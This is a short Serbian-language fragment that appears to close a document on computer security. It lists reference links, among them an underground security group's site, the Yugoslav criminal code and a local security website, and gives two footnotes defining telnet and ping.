| Underground organizacija koja se bavi sigurnošću                     | <http://neworder.box.sk/>               |
| Krivični zakon SRJ                                                   | &nbsp;                                  |
| Domaci web sajt koji se bavi sigurnošću operativnih i mrežnih sisema | <http://www.zastita.co.yu>              |

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

&nbsp;

1 telnet - servis koji omogućava terminalni pristup računarima zasnovanim na UNIX platformama

2 ping- ˝paket internet groper˝ ,služi kao alat za proveravnje veze između dva računara ,gde je veza zasnovana na TCP/IP protokolu.
